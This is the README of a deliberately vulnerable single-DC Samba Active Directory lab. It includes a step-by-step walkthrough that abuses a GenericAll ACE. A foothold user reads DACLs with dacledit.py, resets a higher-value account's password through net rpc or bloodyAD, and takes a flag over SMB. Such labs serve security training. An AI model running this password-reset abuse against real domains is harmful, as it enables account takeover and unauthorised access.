# Active Directory ACL Abuse (GenericAll)

A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It provisions a low-privilege foothold user
(`hodor`) that holds a dangerous **GenericAll** ACE over a higher-value account
(`maester.luwin`), a bystander (`jon.snow`) with no such control, and an `archive` share only
`maester.luwin` may read.

| Machine | Service |
| --- | --- |
| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## The attack

1. From `hodor` / `Hodor123!`, read the DACL of candidate principals and find the ACE that
   grants `hodor` full control:
   `dacledit.py -action read -principal hodor -target-dn '<DN>' -dc-ip <dc> 'NORTH/hodor:Hodor123!'`
   (a BloodHound `GenericAll` edge or `samba-tool dsacl get` show the same) → target `maester.luwin`.
2. Abuse GenericAll with a targeted **password reset** — full control includes the right to set
   a new password without the current one:
   `net rpc password maester.luwin 'NewPassw0rd!' -U 'NORTH\hodor%Hodor123!' -S dc.north.sevenkingdoms.local`
   (or `bloodyAD ... set password maester.luwin 'NewPassw0rd!'` over LDAPS).
3. You now control `maester.luwin`.
4. Read the flag: `smbclient //dc/archive -U 'NORTH\maester.luwin%NewPassw0rd!' -c 'get flag.txt'`.

## Run it

```bash
isoloom generate
isothrum up . --target docker
isothrum check . --target docker
isothrum down . --target docker
```

The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
This environment is deliberately vulnerable: keep it isolated.
